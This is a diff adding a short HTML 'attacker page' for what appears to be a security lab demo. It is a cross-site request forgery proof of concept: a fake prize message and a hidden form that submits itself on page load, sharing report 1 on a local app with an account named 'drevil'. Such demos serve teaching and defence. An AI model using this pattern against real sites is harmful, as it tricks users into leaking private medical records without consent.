@@ -1,0 +1,10 @@
+<!doctype html>
+<!-- ATTACKER PAGE (lab demo only). Served from http://localhost:8000 -->
+<html><body>
+<h1>Congratulations! You won a free health checkup</h1>
+<p>Loading your prize...</p>
+<form id="f" method="POST" action="http://localhost:5000/report/1/share">
+  <input type="hidden" name="doctor" value="drevil">
+</form>
+<script>document.getElementById("f").submit();</script>
+</body></html>
